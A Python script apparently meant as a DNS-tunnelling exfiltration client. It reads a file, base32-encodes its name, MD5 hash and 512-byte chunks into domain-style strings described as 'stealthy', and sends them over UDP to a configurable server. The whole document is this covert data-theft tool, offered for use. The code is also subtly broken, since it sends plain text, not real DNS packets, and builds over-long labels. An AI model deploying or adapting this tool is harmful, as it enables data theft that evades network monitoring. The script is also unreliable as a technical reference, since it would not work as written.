import socket
import base64
import hashlib
import os

DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server
DNS_PORT = 53
domain = "fileupload.example.com"  # Domain to use

# Function to calculate MD5 hash
def calculate_md5(file_path):
    md5_hash = hashlib.md5()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            md5_hash.update(byte_block)
    return md5_hash.hexdigest()

# Function to make strings stealthy (base32 encoding)
def obfuscate_data(data):
    return base64.b32encode(data.encode()).decode().strip("=")

# Function to send a DNS query
def send_dns_query(data, server_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(data.encode(), (server_ip, DNS_PORT))

# Function to send file in chunks
def send_file_chunks(file_path, server_ip, domain):
    file_size = os.path.getsize(file_path)
    chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)

    with open(file_path, "rb") as file:
        for chunk_number in range(total_chunks):
            chunk_data = file.read(chunk_size)
            encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")

            # Send the chunk with an obfuscated identifier
            query = f"{encoded_chunk_data}.{obfuscate_data('chunk')}.{chunk_number}.{domain}"
            print(f"Sending chunk {chunk_number}")
            send_dns_query(query, server_ip)

# Function to send file information
def send_file_info(file_name, file_md5, server_ip, domain):
    # Obfuscate the file name and MD5 hash
    encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
    encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")

    # Send the obfuscated file info as a DNS query
    query = f"{encoded_file_name}.{encoded_file_md5}.{obfuscate_data('fileinfo')}.{domain}"
    print(f"Sending file info: {file_name}, MD5: {file_md5}")
    send_dns_query(query, server_ip)

# Function to signal end of transmission
def send_end_signal(server_ip, domain):
    end_signal = obfuscate_data("zzz") + f".{domain}"
    print("Sending end of transmission signal")
    send_dns_query(end_signal, server_ip)

# Main client function
def send_file(file_path):
    file_name = os.path.basename(file_path)
    file_md5 = calculate_md5(file_path)

    # Send file info
    send_file_info(file_name, file_md5, DNS_SERVER, domain)

    # Send file chunks
    send_file_chunks(file_path, DNS_SERVER, domain)

    # Signal the end of transmission
    send_end_signal(DNS_SERVER, domain)

# Example usage
file_path = input("Enter the file path to send: ")
send_file(file_path)
